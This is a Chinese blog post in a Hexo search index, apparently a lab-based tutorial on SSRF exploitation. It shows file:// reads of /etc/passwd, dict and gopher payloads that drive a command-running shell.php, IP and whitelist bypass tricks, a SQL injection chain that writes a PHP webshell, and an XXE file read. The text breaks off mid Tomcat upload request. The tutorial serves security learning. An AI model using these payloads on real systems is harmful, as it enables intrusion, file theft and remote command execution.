<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SSRF漏洞原理和进阶利用</title>
    <link href="/2025/12/03/SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8/"/>
    <url>/2025/12/03/SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF漏洞原理和进阶利用"><a href="#SSRF漏洞原理和进阶利用" class="headerlink" title="SSRF漏洞原理和进阶利用"></a>SSRF漏洞原理和进阶利用</h1><p>这里用了两个靶场，推荐最完善的靶场</p><p><a href="https://github.com/Duoduo-chino/ssrf-vul-for-new">https://github.com/Duoduo-chino/ssrf-vul-for-new</a></p><p><img src="/img/image-20251203220351550.png" alt="image-20251203220351550"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档等等。SSRF漏洞通过篡改获取资源的请求发送给服务器（服务器并没有检测这个请求是否合法的），然后服务器以他的身份来访问服务器的其他资源。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p><p>PHP中下面函数的使用不当会导致SSRF:</p><p>  file_get_contents()<br>  fsockopen()<br>  curl_exec()   </p><p>从漏洞挖掘的角度而言，见到有请求外部连接的参数，例如url&#x3D;，直接替换内网ip</p><p>还有一些例如转发，下载等等收藏处，导入功能点，都会可能存在ssrf</p><p><img src="/img/image-20251122145350622.png" alt="image-20251122145350622"></p><h2 id="SSRF之信息收集"><a href="#SSRF之信息收集" class="headerlink" title="SSRF之信息收集"></a>SSRF之信息收集</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>伪协议</p><p>file:&#x2F;&#x2F; 从文件系统中读取文件</p><p>dict:&#x2F;&#x2F;字典服务协议，访问字典资源，如dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info;</p><p>ftp:&#x2F;&#x2F;可用于网络端口扫描</p><p>s<a href="ftp://ssh文件传输协议或者安全文件传输协议/">ftp://SSH文件传输协议或者安全文件传输协议</a></p><p>ldap：&#x2F;&#x2F;轻量级目录访问协议</p><p>tftp:&#x2F;&#x2F;简单文件传输协议</p><p>gopher:&#x2F;&#x2F; 分布式文档传递服务</p><h3 id="扫描内网服务器"><a href="#扫描内网服务器" class="headerlink" title="扫描内网服务器"></a>扫描内网服务器</h3><p>查看主机账户密码</p><p>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</p><p><img src="/img/image-20251122164047448.png" alt="image-20251122164047448"></p><p>查看当前操作系统的网卡的ip</p><p>file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts</p><p><img src="/img/image-20251122164324152.png" alt="image-20251122164324152"></p><p>容器 IP <code>172.17.0.6</code> 属于 <code>172.17.0.0/16</code> 网段，这是 Docker 宿主机的桥接网络段,这样就可以去扫描其他内网服务</p><p>显示arp缓存表（寻找内网其他主机）</p><p>file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;arp</p><p><img src="/img/image-20251122165028455.png" alt="image-20251122165028455"></p><p>然后我们可以爆破这个网段的服务，再通过arp表查看存活主机</p><p><img src="/img/image-20251122171716374.png" alt="image-20251122171716374"></p><p>爆破之后查看arp表，就能查看到存活的服务</p><p><img src="/img/image-20251122170541930.png"></p><h3 id="dict伪协议探测端口"><a href="#dict伪协议探测端口" class="headerlink" title="dict伪协议探测端口"></a>dict伪协议探测端口</h3><p>在 SSRF 中 DICT 协议常用于探测内网端口开放情况，”dict:&#x2F;&#x2F;ip:prot”当遇到开放端口时，响应速度会明显变快，有的端口还会带 TCP 回显</p><h6 id="一、DICT伪协议端口探测的核心原理"><a href="#一、DICT伪协议端口探测的核心原理" class="headerlink" title="一、DICT伪协议端口探测的核心原理"></a>一、DICT伪协议端口探测的核心原理</h6><blockquote><h6 id="利用-SSRF-触发服务端建立-TCP-连接，而不验证协议是否正确，从而判断端口是否开放或服务类型。"><a href="#利用-SSRF-触发服务端建立-TCP-连接，而不验证协议是否正确，从而判断端口是否开放或服务类型。" class="headerlink" title="利用 SSRF 触发服务端建立 TCP 连接，而不验证协议是否正确，从而判断端口是否开放或服务类型。"></a><strong>利用 SSRF 触发服务端建立 TCP 连接，而不验证协议是否正确，从而判断端口是否开放或服务类型。</strong></h6></blockquote><p>流程：</p><ol><li><p>SSRF 接受 URL 输入，例如：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">dict:</span><span class="hljs-comment">//127.0.0.1:6379/</span><br></code></pre></td></tr></table></figure></li><li><p>底层解析 URL → 尝试建立 TCP socket 连接</p></li><li><p>目标端口返回任何数据（哪怕报错）→都意味着端口开放</p></li><li><p>根据返回行为产生差异 → 用于端口扫描、服务识别</p></li></ol><p>关键点在于：</p><ul><li><p><strong>DICT 是基于 TCP 的协议</strong></p></li><li><p>SSRF 框架会尝试连接远端，不关心是否真正是字典服务器</p></li><li><h6 id="只要能连接成功，就能获取响应"><a href="#只要能连接成功，就能获取响应" class="headerlink" title="只要能连接成功，就能获取响应"></a><strong>只要能连接成功，就能获取响应</strong></h6></li></ul><p>因此 DICT SSRF 本质上属于 <strong>协议欺骗（Protocol Smuggling）</strong>。</p><hr><h6 id="✅-二、差异体现在哪里？（判断端口状态）"><a href="#✅-二、差异体现在哪里？（判断端口状态）" class="headerlink" title="✅ 二、差异体现在哪里？（判断端口状态）"></a>✅ 二、差异体现在哪里？（判断端口状态）</h6><p>DICT SSRF 的结果<strong>本质是连接行为差异 + 返回内容差异</strong></p><hr><h6 id="1）连接行为差异-—-端口探测最直接："><a href="#1）连接行为差异-—-端口探测最直接：" class="headerlink" title="1）连接行为差异 — 端口探测最直接："></a>1）连接行为差异 — 端口探测最直接：</h6><table><thead><tr><th>行为</th><th>说明</th></tr></thead><tbody><tr><td>TCP 连接成功</td><td>端口开放</td></tr><tr><td><code>connection refused</code></td><td>端口关闭</td></tr><tr><td>超时</td><td>被防火墙 DROP&#x2F;过滤</td></tr></tbody></table><p>这类差异明确直接 → 能判断端口状态。</p><hr><h6 id="2）返回内容差异-—-服务识别"><a href="#2）返回内容差异-—-服务识别" class="headerlink" title="2）返回内容差异 — 服务识别"></a>2）返回内容差异 — 服务识别</h6><p>即便不是 DICT 协议，对方服务会返回 banner&#x2F;握手包：</p><table><thead><tr><th>端口</th><th>特征</th></tr></thead><tbody><tr><td>Redis 6379</td><td><code>-ERR</code></td></tr><tr><td>MySQL 3306</td><td>二进制握手包（乱码）</td></tr><tr><td>HTTP 80</td><td><code>HTTP/1.1</code> 开头</td></tr><tr><td>SMTP 25</td><td><code>220</code> 开头</td></tr><tr><td>SSH 22</td><td><code>SSH-2.0</code></td></tr></tbody></table><p>说明：</p><ul><li><p><strong>DICT 的请求内容无意义</strong></p></li><li><p>但由于 TCP 连接建立 → 对方服务会按自身协议回复</p></li></ul><p>➡️ 这就构成 <strong>协议指纹</strong>。</p><hr><h6 id="3）延迟差异-—-网络策略判断"><a href="#3）延迟差异-—-网络策略判断" class="headerlink" title="3）延迟差异 — 网络策略判断"></a>3）延迟差异 — 网络策略判断</h6><table><thead><tr><th>状态</th><th>表现</th></tr></thead><tbody><tr><td>开放（有响应）</td><td>很快</td></tr><tr><td>拒绝（RST）</td><td>很快</td></tr><tr><td>防火墙 DROP</td><td>非常慢（等待超时）</td></tr></tbody></table><p>➡️ 用来判断 WAF&#x2F;ACL&#x2F;容器隔离策略。</p><hr><h6 id="🔥-概括一句话"><a href="#🔥-概括一句话" class="headerlink" title="🔥 概括一句话"></a>🔥 概括一句话</h6><blockquote><p>DICT SSRF &#x3D; TCP 端口探测 + 服务指纹识别 + 网络策略检测</p></blockquote><hr><p>挂到bp里面进行爆破</p><p><img src="/img/image-20251124122337390.png" alt="image-20251124122337390"></p><p>通过响应长度能判断端口是否开放</p><p><img src="/img/image-20251124122431915.png" alt="image-20251124122431915"></p><h3 id="Http伪协议探测目录"><a href="#Http伪协议探测目录" class="headerlink" title="Http伪协议探测目录"></a>Http伪协议探测目录</h3><p>这一步其实和前面的思路差不多，将url放到bp对其进行页面爆破，通过响应长度即可判断存在页面</p><p><img src="/img/image-20251125210703616.png" alt="image-20251125210703616"></p><p>成功扫描出路径</p><p><img src="/img/image-20251125210836067.png" alt="image-20251125210836067"></p><h2 id="gopher伪协议攻击"><a href="#gopher伪协议攻击" class="headerlink" title="gopher伪协议攻击"></a>gopher伪协议攻击</h2><p>基本格式</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP</span>数据流&gt;<br></code></pre></td></tr></table></figure><p>注意：<port>默认为70 ，发起多条请求每条要用回车换行去隔开使用%0d%0a隔开，如果多个参数，参数之间的&amp;也需要进行URL编码</p><h4 id="gopher伪协议构造GET攻击"><a href="#gopher伪协议构造GET攻击" class="headerlink" title="gopher伪协议构造GET攻击"></a>gopher伪协议构造GET攻击</h4><p><img src="/img/image-20251125211145553.png" alt="image-20251125211145553"></p><p>1、在页面端提交，因为从请求从跳板机发送到内网受害主机，需要在内网受害主机进行一次URL解码，那么我们就需要先将playload进行一次url编码</p><p>playload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/shell.php?cmd=cat+flag</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.72.23.22<br><br></code></pre></td></tr></table></figure><p>注意最后要保留个换行</p><p>进行一次url编码后得到</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%47</span><span class="hljs-variable">%45</span><span class="hljs-variable">%54</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%20</span><span class="hljs-variable">%48</span><span class="hljs-variable">%54</span><span class="hljs-variable">%54</span><span class="hljs-variable">%50</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%31</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%48</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%31</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%33</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%32</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br></code></pre></td></tr></table></figure><p>完整在网页端提交的请求就是</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">172.72</span>.<span class="hljs-number">23.22</span>:<span class="hljs-number">80</span>/_<span class="hljs-variable">%47</span><span class="hljs-variable">%45</span><span class="hljs-variable">%54</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%20</span><span class="hljs-variable">%48</span><span class="hljs-variable">%54</span><span class="hljs-variable">%54</span><span class="hljs-variable">%50</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%31</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%48</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%31</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%33</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%32</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br></code></pre></td></tr></table></figure><p>2、在bp端，由于BP 是「手动构造 HTTP 请求」的工具，不会像浏览器那样自动帮你补全编码 —— 你写的 payload 会原封不动发送给后端，所以需要手动完成「双重 URL 编码」，才能让后端解码后得到正确的 gopher URL。</p><p>所以我们要先抓到包</p><p><img src="/img/image-20251125215258816.png" alt="image-20251125215258816"></p><p>补全请求，如何进行两次url编码</p><p><img src="/img/image-20251125215540692.png" alt="image-20251125215540692"></p><p><img src="/img/image-20251125215613841.png" alt="image-20251125215613841"></p><p>如此一来便能成功执行攻击</p><h4 id="gopher伪协议构造POST攻击"><a href="#gopher伪协议构造POST攻击" class="headerlink" title="gopher伪协议构造POST攻击"></a>gopher伪协议构造POST攻击</h4><p>和上面步骤类似，但是不需要再加换行符，给改为POST的攻击代码即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.72.23.24<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>15<br><br><span class="language-abnf"><span class="hljs-attribute">ip</span><span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">;id</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20251127145238924.png" alt="image-20251127145238924"></p><h3 id="SSRF之环回地址绕过"><a href="#SSRF之环回地址绕过" class="headerlink" title="SSRF之环回地址绕过"></a>SSRF之环回地址绕过</h3><p>在一些情况下，请求的目的IP会被后端限制，比如不允许访问127.0.0.1</p><p>这时候我们进行进制转换就能绕过</p><table><thead><tr><th>原始 IP（127.0.0.1）</th><th>变形格式（可直接使用）</th><th>说明</th></tr></thead><tbody><tr><td>十进制点分格式</td><td><code>127.0.0.2</code>、<code>127.0.1.1</code></td><td>127.0.0.0&#x2F;8 网段全是本地回环地址，仅过滤 <code>127.0.0.1</code> 时可用</td></tr><tr><td>十进制整数格式</td><td><code>2130706433</code></td><td>IP 转整数（127<em>256³+0</em>256²+0*256+1）</td></tr><tr><td>八进制格式</td><td><code>0177.0.0.1</code>、<code>017700000001</code></td><td>前缀加 <code>0</code> 表示八进制，后端解析仍为 127.0.0.1</td></tr><tr><td>十六进制格式</td><td><code>0x7F.0.0.1</code>、<code>0x7F000001</code></td><td>部分后端（如 curl）支持十六进制 IP 解析</td></tr><tr><td>省略点分格式</td><td><code>127.1</code>（等价 127.0.0.1）、<code>127.0.1</code></td><td>后端自动补全前导 0，适用于简单过滤逻辑</td></tr></tbody></table><p><img src="/img/image-20251126145236226.png" alt="image-20251126145236226"></p><h3 id="SSRF重定向绕过"><a href="#SSRF重定向绕过" class="headerlink" title="SSRF重定向绕过"></a>SSRF重定向绕过</h3><ul><li><strong>前端攻击者</strong>：构造 <code>url=http://公网服务器A/redirect</code>（公网地址，后端校验合法）；</li><li><strong>公网服务器 A</strong>：收到请求后返回 302 响应，响应头 <code>Location: gopher://127.0.0.1:80/_GET...</code>（目标是私网 &#x2F; 危险地址）；</li><li><strong>后端服务器</strong>：执行 <code>curl($url)</code> 时，默认会自动跟随 302 跳转，最终访问 <code>Location</code> 中的私网 &#x2F; 危险地址，完成绕过。</li></ul><p><img src="/img/image-20251126134449331.png" alt="image-20251126134449331"></p><p>我们在vps上起一个php服务</p><p><img src="/img/image-20251126141002284.png" alt="image-20251126141002284"></p><p><img src="/img/image-20251126141022877.png" alt="image-20251126141022877"></p><p>然后在令ssrf服务访问我们的vps服务即可</p><p><img src="/img/image-20251126141113611.png" alt="image-20251126141113611"></p><h3 id="SSRF之DNS重绑定绕过"><a href="#SSRF之DNS重绑定绕过" class="headerlink" title="SSRF之DNS重绑定绕过"></a>SSRF之DNS重绑定绕过</h3><p>利用 DNS 解析的动态性和后端校验的时间差 —— 攻击者控制一个域名的 DNS 解析规则，让后端在<strong>校验阶段</strong>解析该域名得到合法公网 IP（通过私网 IP 过滤），而在<strong>实际请求阶段</strong>，因 DNS 缓存失效或服务器动态返回结果，该域名又解析为靶场的私网 &#x2F; 本地 IP，后端未对这一二次解析结果做校验，最终让原本被限制的私网地址访问请求成功执行，以此绕过后端基于 IP 或域名的严格过滤规则</p><p>原理如图</p><p><img src="/img/image-20251126150827848.png" alt="image-20251126150827848"></p><p>对此我们只需要利用一个网站配置DNS重绑定</p><p><img src="/img/image-20251126150933105.png" alt="image-20251126150933105"></p><p>对此即可成功执行攻击</p><p><img src="/img/image-20251126150510320.png" alt="image-20251126150510320"></p><h3 id="SSRF之白名单绕过"><a href="#SSRF之白名单绕过" class="headerlink" title="SSRF之白名单绕过"></a>SSRF之白名单绕过</h3><p>如果场景要求url必须要有某些参数，则可以利用 <code>@</code> 符号</p><p>URL 中 <code>@</code> 符号的作用是分隔 “用户认证信息” 和 “实际访问地址”，后端若仅校验字符串包含 <code>http://notfound.ctfhub.com</code>，而未解析 URL 结构，就会被绕过：</p><ul><li><strong>构造 payload</strong>：<code>http://notfound.ctfhub.com@127.0.0.1:80</code></li><li><strong>原理</strong>：字符串中完整包含 <code>http://notfound.ctfhub.com</code>，满足格式要求；但 <code>curl</code> 等工具会忽略 <code>@</code> 前的内容，实际访问 <code>127.0.0.1:80</code>（本地私网地址）。</li><li><strong>进阶</strong>：若需指定路径，可继续拼接：<code>http://notfound.ctfhub.com@127.0.0.1:80/shell.php</code></li></ul><h3 id="ssrf进行sql注入攻击并且getshell"><a href="#ssrf进行sql注入攻击并且getshell" class="headerlink" title="ssrf进行sql注入攻击并且getshell"></a>ssrf进行sql注入攻击并且getshell</h3><p>注意：需要进行url编码不然无法被解析</p><h4 id="1、判断闭合方式"><a href="#1、判断闭合方式" class="headerlink" title="1、判断闭合方式"></a>1、判断闭合方式</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h4 id="2、爆列数"><a href="#2、爆列数" class="headerlink" title="2、爆列数"></a>2、爆列数</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 测试3列（预期报错）</span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br><br><span class="hljs-comment"># 测试4列（预期无报错）</span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h4 id="3、爆库名"><a href="#3、爆库名" class="headerlink" title="3、爆库名"></a>3、爆库名</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database(),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h4 id="4、爆表名"><a href="#4、爆表名" class="headerlink" title="4、爆表名"></a>4、爆表名</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select%<span class="hljs-number">20</span>table_name%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>information_schema.tables%<span class="hljs-number">20</span>where%<span class="hljs-number">20</span>table_schema=database()%<span class="hljs-number">20</span>limit%<span class="hljs-number">200</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h4 id="5、爆字段名"><a href="#5、爆字段名" class="headerlink" title="5、爆字段名"></a>5、爆字段名</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select%<span class="hljs-number">20</span>column_name%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>information_schema.columns%<span class="hljs-number">20</span>where%<span class="hljs-number">20</span>table_schema=database()%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>table_name=&#x27;flag_is_here&#x27;%<span class="hljs-number">20</span>limit%<span class="hljs-number">200</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h4 id="6、读取flag"><a href="#6、读取flag" class="headerlink" title="6、读取flag"></a>6、读取flag</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select%<span class="hljs-number">20</span>content%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>flag_is_here%<span class="hljs-number">20</span>limit%<span class="hljs-number">200</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h4 id="7、拿shell"><a href="#7、拿shell" class="headerlink" title="7、拿shell"></a><img src="/img/image-20251126215531631.png" alt="image-20251126215531631">7、拿shell</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>and%<span class="hljs-number">201</span>=<span class="hljs-number">0</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">20</span>NULL,NULL,NULL,&#x27;%<span class="hljs-number">3</span>C?php%<span class="hljs-number">20</span>passthru($_GET[%<span class="hljs-number">22</span>cmd%<span class="hljs-number">22</span>]);?%<span class="hljs-number">3</span>E&#x27;%<span class="hljs-number">20</span>into%<span class="hljs-number">20</span>dumpfile%<span class="hljs-number">20</span>&#x27;/var/www/html/shell_pure.php&#x27;%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20251126220510840.png" alt="image-20251126220510840"></p><h3 id="SSRF打XXE漏洞"><a href="#SSRF打XXE漏洞" class="headerlink" title="SSRF打XXE漏洞"></a>SSRF打XXE漏洞</h3><p>查看页面源代码明显是一个XXE漏洞</p><p><img src="/img/image-20251127145833155.png" alt="image-20251127145833155"></p><p>构造playload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/doLogin.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.72.23.25<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml;charset=UTF-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>112<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>放到bp对playload进行二次编码</p><p><img src="/img/image-20251127145934716.png" alt="image-20251127145934716"></p><p>最后发包即可利用</p><h3 id="ssrf利用tomcat任意文件写入"><a href="#ssrf利用tomcat任意文件写入" class="headerlink" title="ssrf利用tomcat任意文件写入"></a>ssrf利用tomcat任意文件写入</h3><p>编写playload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/1.jsp/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.72.23.26:8080<br><span 